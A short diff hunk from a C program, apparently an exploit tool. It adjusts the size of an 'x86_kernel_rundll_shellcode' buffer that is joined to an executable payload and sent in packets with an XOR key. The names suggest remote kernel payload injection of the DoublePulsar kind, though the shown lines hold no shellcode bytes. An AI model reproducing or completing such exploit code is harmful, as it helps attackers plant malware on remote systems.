@@ -776,8 +776,8 @@ int main(int argc, char* argv[])
 	printf("will send %d packets\n ", numberofpackets);
 	printf("%d as a remainder\n", iterations);
 
-	memcpy(pFULLBUFFER, x86_kernel_rundll_shellcode, 6144);
-	memcpy(pFULLBUFFER + 6144, pExeBuffer, dwFileSizeLow);
+	memcpy(pFULLBUFFER, x86_kernel_rundll_shellcode, 4869);
+	memcpy(pFULLBUFFER + 4869, pExeBuffer, dwFileSizeLow);
 
 	//unsigned int XorKey = 0x58581162;
 	unsigned char byte_xor_key[5];
